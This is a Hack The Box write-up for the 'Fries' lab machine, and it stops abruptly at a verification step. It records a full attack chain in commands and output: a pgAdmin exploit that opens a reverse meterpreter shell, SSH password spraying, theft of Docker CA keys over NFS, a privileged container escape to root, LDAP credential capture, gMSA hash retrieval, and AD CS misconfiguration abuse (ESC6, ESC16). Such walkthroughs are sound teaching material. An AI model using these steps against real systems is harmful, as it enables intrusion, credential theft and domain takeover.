# **Fries - HTB**


Nmap scan

```bash
nmap -sV -sC 10.129.244.72
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 10:31 +0545
Nmap scan report for 10.129.244.72
Host is up (0.72s latency).
Not shown: 983 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-24 11:49:09Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2026-02-24T11:51:49+00:00; +7h00m02s from scanner time.
443/tcp   open  ssl/https         nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?
|_ssl-date: 2026-02-24T11:51:43+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-24T11:51:50+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
3269/tcp  open  globalcatLDAPssl?
|_ssl-date: 2026-02-24T11:51:45+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  unknown
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 297.64 seconds
```

Add to /etc/hosts


```bash
cat /etc/hosts
10.129.244.72   DC01.fries.htb fries.htb pwm.fries.htb 
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```


Given credentials


```credentials
d.cooper@fries.htb
D4LE11maan!!
```

<img width="1251" height="982" alt="Screenshot 2026-02-24 105220" src="https://github.com/user-attachments/assets/9c575dc4-f012-4aef-b5fa-a815b76fe230" />

No access with the given credentials.


Subdomain enumeration




```bash
ffuf -u http://fries.htb -H "Host: FUZZ.fries.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

code                    [Status: 200, Size: 13592, Words: 1048, Lines: 272, Duration: 257ms]
:: Progress: [5000/5000] :: Job [1/1] :: 110 req/sec :: Duration: [0:01:21] :: Errors: 0 ::
```

Add to hosts

```bash
cat /etc/hosts
10.129.244.72   DC01.fries.htb fries.htb pwm.fries.htb code.fries.htb 
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```


<img width="1257" height="953" alt="Screenshot 2026-02-24 105817" src="https://github.com/user-attachments/assets/ce697811-7a85-4d59-ab33-e8e6b80f251e" />

We find a repository.

<img width="1257" height="949" alt="Screenshot 2026-02-24 105954" src="https://github.com/user-attachments/assets/efb735ee-e139-4120-a3fd-9947f699a191" />

<img width="1253" height="946" alt="Screenshot 2026-02-24 110037" src="https://github.com/user-attachments/assets/92c52162-6940-400a-b357-d582d63f3e52" />

Description tells us about dbms subdomain. Add to hosts.

```bash
cat /etc/hosts                                                                                                                                        
10.129.244.72   DC01.fries.htb fries.htb pwm.fries.htb code.fries.htb db-mgmt05.fries.htb
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

<img width="1257" height="978" alt="1" src="https://github.com/user-attachments/assets/464a8bbb-ab4e-4857-9442-7dbc268e9780" />

Credential of database found

```bash
DATABASE_URL=postgresql://root:Ps...11@172.18.0.3:5432/ps_db
SECRET_KEY=y0...9a
```

<img width="1254" height="952" alt="Screenshot 2026-02-24 110610" src="https://github.com/user-attachments/assets/01de4572-a636-4bbe-b2c3-c642e1194728" />


This version of pgadmin is vulnerable.

CVE-2025-2945

Start metasploit.

```bash
msf exploit(multi/http/pgadmin_query_tool_authenticated) > show options

Module options (exploit/multi/http/pgadmin_query_tool_authenticated):

   Name           Current Setting      Required  Description
   ----           ---------------      --------  -----------
   DB_NAME        ps_db                yes       The database to authenticate to
   DB_PASS        PsqLR00tpaSS11       yes       The password to authenticate to the database with
   DB_USER        root                 yes       The username to authenticate to the database with
   MAX_SERVER_ID  10                   yes       The maximum number of Server IDs to try and connect to.
   PASSWORD       D4LE11maan!!         yes       The password to authenticate to pgadmin with
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, s
                                                 ocks5, socks5h
   RHOSTS         db-mgmt05.fries.htb  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80                   yes       The target port (TCP)
   SSL            false                no        Negotiate SSL/TLS for outgoing connections
   USERNAME       d.cooper@fries.htb   yes       The username to authenticate to pgadmin with
   VHOST          db-mgmt05.fries.htb  no        HTTP server virtual host


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.46      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python payload


View the full module info with the info, or info -d command.
```

Set all things.

```bash
msf exploit(multi/http/pgadmin_query_tool_authenticated) > run
[*] Started reverse TCP handler on 10.10.16.46:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (23404 bytes) to 10.129.244.72
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.16.46:4444 -> 10.129.244.72:49824) at 2026-02-24 11:08:10 +0545

meterpreter > getuid
Server username: pgadmin
```

Shell as pgadmin in docker.

Reading environment variables.

```bash
meterpreter > shell
Process 140 created.
Channel 1 created.

id
uid=5050(pgadmin) gid=0(root) groups=0(root)


env
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=Fri.....25!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:4609757
PYTHONPATH=/pgadmin4
```

Password discovered --> PGADMIN_DEFAULT_PASSWORD:Fri.....25!!

To password spray, list all names found till now.

```bash
cat users.txt
admin
d.cooper
svc
svc_infra
postgres
pgadmin
```


Hydra to brute force ssh login.




```bash
hydra -L users.txt -p 'Fri.....25!!' ssh://10.129.244.72 -vV -t 6
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                                                                                                     

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-24 11:19:14
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.129.244.72:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://admin@10.129.244.72:22
[INFO] Successful, password authentication is supported by ssh://10.129.244.72:22
[ATTEMPT] target 10.129.244.72 - login "admin" - pass "Fri.....25!!" - 1 of 6 [child 0] (0/0)
[ATTEMPT] target 10.129.244.72 - login "d.cooper" - pass "Fri.....25!!" - 2 of 6 [child 1] (0/0)
[ATTEMPT] target 10.129.244.72 - login "svc" - pass "Fri.....25!!" - 3 of 6 [child 2] (0/0)
[ATTEMPT] target 10.129.244.72 - login "svc_infra" - pass "Fri.....25!!" - 4 of 6 [child 3] (0/0)
[ATTEMPT] target 10.129.244.72 - login "postgres" - pass "Fri.....25!!" - 5 of 6 [child 4] (0/0)
[ATTEMPT] target 10.129.244.72 - login "pgadmin" - pass "Fri.....25!!" - 6 of 6 [child 5] (0/0)
[22][ssh] host: 10.129.244.72   login: svc   password: Fri.....25!!
[STATUS] attack finished for 10.129.244.72 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-24 11:19:34
```

Valid login found, svc:Fri.....25!!

Login with ssh.

```bash
ssh svc@10.129.244.72
The authenticity of host '10.129.244.72 (10.129.244.72)' can't be established.
ED25519 key fingerprint is: SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.72' (ED25519) to the list of known hosts.
svc@10.129.244.72's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Feb 24 12:31:18 PM UTC 2026

  System load:  0.0                Processes:             169
  Usage of /:   66.7% of 13.67GB   Users logged in:       0
  Memory usage: 49%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm                                                                                      
                                                                                                                                                          
                                                                                                                                                          
The list of available updates is more than a week old.                                                                                                    
To check for new updates run: sudo apt update                                                                                                             
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                     
                                                                                                                                                          
                                                                                                                                                          
Last login: Wed Nov 19 20:53:19 2025 from 10.10.14.77                                                                                                     
svc@web:~$  
```


check docker permissions.



```bash
svc@web:/home$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Feb 24 11:37 /var/run/docker.sock
svc@web:/home$ ps aux | grep dockerd
root         929  0.0  2.6 1955936 78528 ?       Ssl  11:37   0:03 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --authorization-plugin=authz-broker --tlsverify --tlscacert=/etc/docker/certs/ca.pem --tlscert=/etc/docker/certs/server-cert.pem --tlskey=/etc/docker/certs/server-key.pem -H=127.0.0.1:2376
```


Discovering docker network.

```bash
svc@web:/home$ ip route
default via 192.168.100.1 dev eth0 proto static 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.18.0.0/16 dev br-0d1a963edc58 proto kernel scope link src 172.18.0.1 
192.168.100.0/24 dev eth0 proto kernel scope link src 192.168.100.2
```


Port scanning on docker network.

```bash
svc@web:/home$ python3 -c "import socket; services={22:'SSH', 80:'HTTP', 111:'RPC', 443:'HTTPS', 2049:'NFS', 3000:'Node.js', 8443:'HTTPS-Alt'}; [print(f'Port {p} ({services.get(p, \"Unknown\")}) - Open') for p in [22,80,111,443,2049,3000,8443] if socket.socket().connect_ex(('172.18.0.1', p)) == 0]"
Port 22 (SSH) - Open
Port 80 (HTTP) - Open
Port 111 (RPC) - Open
Port 443 (HTTPS) - Open
Port 2049 (NFS) - Open
Port 3000 (Node.js) - Open
Port 8443 (HTTPS-Alt) - Open
```


Discovered port 2049 (nfs), sshuttle for making a tunnel to docker nwtwork.

```bash
sshuttle -r svc@10.129.244.72 -N
svc@10.129.244.72's password: 
c : Connected to server.
```

Now, we can nfs from our machine. Listing moutable list.

```bash
showmount -e 192.168.100.2                                                                                                                            
Export list for 192.168.100.2:
/srv/web.fries.htb *
```


Make a directory and mount on our machine.

```bash
sudo mkdir -p /mnt/fries_nfs


sudo mount -t nfs 192.168.100.2:/srv/web.fries.htb /mnt/fries_nfs
```

We have certs directory, which can be accessed by group (59605603)

```bash
ls -la                                                                                                                                                
total 20
drw-r-xr-x 5  655 root     4096 May 28  2025 .
drwxr-xr-x 5 root root     4096 Feb 24 11:41 ..
drwxrwx--- 2 root 59605603 4096 May 26  2025 certs
drwxrwxrwx 2 root root     4096 Feb 24  2026 shared
drwxr----- 5 kali kali     4096 Jun  7  2025 webroot
```

So, we make a group, and add our kali user in that group.

```bash
sudo groupadd -g 59605603 fries_certs                                                                                                                 

sudo usermod -aG fries_certs kali                                                                                                                     

newgrp fries_certs                                                                                                                                    
```

Now, we can get into certs directory.

```bash
cd certs   

ls -la                                                                                                                                                
total 32
drwxrwx--- 2 root fries_certs 4096 May 26  2025 .
drw-r-xr-x 5  655 root        4096 May 28  2025 ..
-rw-r----- 1 root fries_certs 1708 Feb 24  2026 ca-key.pem
-rw-r----- 1 root fries_certs 1111 Feb 24  2026 ca.pem
-rw-r----- 1 root fries_certs 1115 Feb 24  2026 server-cert.pem
-rw-r----- 1 root fries_certs  940 Feb 24  2026 server.csr
-rw-r----- 1 root fries_certs 1704 Feb 24  2026 server-key.pem
-rw-r----- 1 root fries_certs  205 Feb 24  2026 server-openssl.cnf
```

Docker certificates, we can forge a certificate ourselves.



```bash
openssl genrsa -out client-key.pem 4096


openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"


openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out client-cert.pem -days 365
Certificate request self-signature ok
subject=CN=root
```

Certificate is forged, verify by listing the running docker containers.

```bash
docker -H tcp://127.0.0.1:2376 --tlsverify \                                                                                                          
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  ps -a
CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS       PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        8 months ago   Up 2 hours   0.0.0.0:8443->8443/tcp, :::8443->8443/tcp                                    pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         9 months ago   Up 2 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   9 months ago   Up 2 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   9 months ago   Up 2 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   9 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```



Success, now we can enter the fries-web docker with root privileges.

```bash
docker -H tcp://127.0.0.1:2376 --tlsverify \                                                                                                          
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  run -it --privileged -v /:/host fries-web /bin/bash
root@c2b17812c7c2:/app#
```

We are in fries-web docker, let's switch to host.

```bash
root@c2b17812c7c2:~# chroot /host
# id
uid=0(root) gid=0(root) groups=0(root)
```

First flag.

```bash
# cat user.txt
b3.....df
```

We have ssh keys, bring that to your machine.


```bash
# cd .ssh
# ls
authorized_keys  id_rsa  id_rsa.pub
```



Change permissions in the key and login as root.



```bash
chmod 600 id_rsa                                                                                                                                      

ssh root@10.129.244.72 -i id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Feb 24 01:41:32 PM UTC 2026

  System load:  0.0                Processes:             179
  Usage of /:   66.7% of 13.67GB   Users logged in:       1
  Memory usage: 50%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Nov 19 19:37:00 2025
root@web:~#
```


Found the configuration file, with credentials.



```bash
root@web:~/scripts/pwm/config# cat PwmConfiguration.xml 
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2025-06-01T02:07:43Z" modifyTime="2025-06-01T19:53:04Z" pwmBuild="b7ed22b" pwmVersion="2.0.8" xmlVersion="5">
    <!--
                This configuration file has been auto-generated by the PWM password self service application.

                WARNING: This configuration file contains sensitive security information, please handle with care!

                WARNING: If a server is currently running using this configuration file, it will be restarted and the
                 configuration updated immediately when it is modified.

                NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
                        support UTF-8 encoding.

                If unable to edit using the application ConfigurationEditor web UI, the following options are available:
                      1. Edit this file directly by hand.
                      2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
                         This will allow access to the ConfigurationEditor web UI without having to authenticate to an
                         LDAP server first.

                If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
                "storePlaintextValues" to "true".
-->
    <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2y$04$W1Tu..........exGyG</property>
    </properties>
.
.
.
        <setting key="ldap.proxy.username" modifyTime="2025-06-01T02:07:43Z" profile="default" syntax="STRING" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
            <value>CN=svc_infra,CN=Users,DC=fries,DC=htb</value>
.
.
.
```


Credentials--> svc_infra:$2y$04$W1Tu..........exGyG


Cracking the password hash.


```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ro...n!          (?)     
1g 0:00:00:02 DONE (2026-02-24 12:36) 0.3875g/s 8623p/s 8623c/s 8623C/s tanesha..prakash
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


Use the credentials to login to pwn.fries.htb. Add your IP address and port on ldap urls.

<img width="1258" height="967" alt="Screenshot 2026-02-24 124309" src="https://github.com/user-attachments/assets/817c8d00-eb08-4a17-8f37-3798e49e8929" />

Start a listener with metasploit.

```bash
msf auxiliary(server/capture/ldap) > show options

Module options (auxiliary/server/capture/ldap):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   CHALLENGE  chYxxgOAPnF5qDuq  yes       The 8 byte challenge
   SRVHOST    0.0.0.0           yes       The ip address to listen on.
   SRVPORT    4444              yes       The port to listen on.


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run an LDAP capture server



View the full module info with the info, or info -d command.

msf auxiliary(server/capture/ldap) >
```

Logout and login on pwn.fries.htb.

```bash
msf auxiliary(server/capture/ldap) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/capture/ldap) > 
[*] Server started.






[*] Server started.
[+] LDAP Login Attempt => From:10.129.244.72:49896  Username:       password:m6...0d
[+] LDAP Login Attempt => From:10.129.244.72:49808       Username:       password:m6...0d
[+] LDAP Login Attempt => From:10.129.244.72:49812       Username:       password:m6...0d
```

Password captured for Active Directory --> svc_infra:m6...0d

Verify the credentials are correct.

```bash
nxc ldap 10.129.244.72 -u svc_infra -p 'm6...0d'                                                                                      
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)                                                                                                                                                  
LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6...0d 
```


The credential were correct, now we can use bloodhound to collection the information on AD.

```bash
bloodhound-python -u 'svc_infra' -p 'm6...0d' -d 'fries.htb' -dc 'DC01.fries.htb' -ns 10.129.244.72 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: DC01.fries.htb
INFO: Testing resolved hostname connectivity dead:beef::183
INFO: Trying LDAP connection to dead:beef::183
INFO: Testing resolved hostname connectivity dead:beef::2885:b848:416a:4772
INFO: Trying LDAP connection to dead:beef::2885:b848:416a:4772
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: DC01.fries.htb
INFO: Testing resolved hostname connectivity dead:beef::183
INFO: Trying LDAP connection to dead:beef::183
INFO: Testing resolved hostname connectivity dead:beef::2885:b848:416a:4772
INFO: Trying LDAP connection to dead:beef::2885:b848:416a:4772
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: All nameservers failed to answer the query web. IN A: Server Do53:10.129.244.72@53 answered SERVFAIL
INFO: Done in 01M 37S
```

Looking in bloodhound svc_infra can read gmsa password.




<img width="1256" height="972" alt="Screenshot 2026-02-24 142659" src="https://github.com/user-attachments/assets/731cf307-a2b7-4f88-adc6-96cb71f8917c" />






Request for gmsa hash.


```bash
nxc ldap 10.129.244.72 -u svc_infra -p 'm6...0d' --gmsa
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6...Q0d 
LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: cb.....ad     PrincipalsAllowedToReadPassword: svc_infra
```

New credentials --> gMSA_CA_prod$:cb.....ad

Check if we can remote login allowed.

```bash
nxc winrm 10.129.244.72 -u 'gMSA_CA_prod$' -H 'cb.....ad'
WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.244.72   5985   DC01             [+] fries.htb\gMSA_CA_prod$:cb.....ad (Pwn3d!)
```


(Pwn3d!)... We can login with the credentials we have.


```bash
evil-winrm -i 10.129.244.72 -u 'gMSA_CA_prod$' -H 'cb.....ad'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> whoami
fries\gmsa_ca_prod$
```



We can now enroll ourselves as officer, to manage certificates.



```bash
certipy-ad ca -u 'gMSA_CA_prod$' -hashes :cb.....ad \
  -ca 'fries-DC01-CA' \
  -target 'DC01.fries.htb' \
  -target-ip 10.129.244.72 \
  -dc-ip 10.129.244.72 \
  -add-officer 'gMSA_CA_prod$' \
  -debug
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.244.72'
[+] DC IP: '10.129.244.72'
[+] DC Host: None
[+] Target IP: '10.129.244.72'
[+] Remote Name: 'DC01.fries.htb'
[+] Domain: ''
[+] Username: 'GMSA_CA_PROD$'
[+] Authenticating to LDAP server using NTLM authentication
[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
[+] Using LDAP channel binding for NTLM authentication
[+] LDAP NTLM authentication successful
[+] Bound to ldaps://10.129.244.72:636 - ssl
[+] Default path: DC=fries,DC=htb
[+] Configuration path: CN=Configuration,DC=fries,DC=htb
[+] Trying to get DCOM connection for: '10.129.244.72'
[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
```

There are no vulnerable certificate templates, but as an officer we can add the template ourselves.

Enable ESC6

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CA = New-Object -ComObject CertificateAuthority.Admin
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $Config = "DC01.fries.htb\fries-DC01-CA"
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $current = 1114446
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $new = $current -bor 0x00040000
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new) 
```

Restart Service.

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> Restart-Service -Name CertSvc -Force
```

Verify.

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefaulags:

  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
CertUtil: -getreg command completed successfully.
```

EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144) ---> This line verifies ESC6 is now enabled.

Now, we need to enable 1 more template.

Enable ESC16

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CA = New-Object -ComObject CertificateAuthority.Admin
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> $CA.SetConfigEntry("DC01.fries.htb\fries-DC01-CA", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")
```

Verify

```bash
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
